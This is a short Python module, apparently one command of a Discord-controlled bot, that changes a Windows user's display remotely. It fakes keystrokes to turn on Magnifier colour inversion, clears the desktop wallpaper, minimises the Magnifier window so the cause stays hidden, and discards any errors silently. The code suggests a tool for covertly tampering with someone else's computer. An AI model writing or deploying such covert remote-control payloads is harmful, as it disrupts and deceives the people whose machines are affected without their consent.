import ctypes
import win32gui
import ctypes
import threading
import time
import asyncio
active_effects = {}

async def invcol(ctx):
    try:
        enum_windows_proc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_void_p)
        user32 = ctypes.windll.user32

        def fin():
            def enum_windows_callback(hwnd, lParam):
                window_title = ctypes.create_unicode_buffer(512)
                user32.GetWindowTextW(hwnd, window_title, 512)
                if "Magnifier" in window_title.value:
                    user32.PostMessageW(hwnd, 0x0112, 0xF020, 0)
                return True

            user32.EnumWindows(enum_windows_proc(enum_windows_callback), 0)

        def pk(key_code, down=True):
            action = 0 if down else 2
            ctypes.windll.user32.keybd_event(key_code, 0, action, 0)

        ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, None, 0)

        pk(0x5B, True)
        pk(0x6B, True)
        pk(0x5B, False)
        pk(0x6B, False)

        await asyncio.sleep(0.5)

        pk(0x11, True)
        pk(0x12, True)
        pk(0x49, True)
        pk(0x49, False)
        pk(0x12, False)
        pk(0x11, False)

        pk(0x5B, True)
        pk(0x6D, True)
        pk(0x6D, False)
        pk(0x5B, False)

        await asyncio.sleep(0.5)

        fin()

        await ctx.send("inverted colors")
    except Exception:
        pass  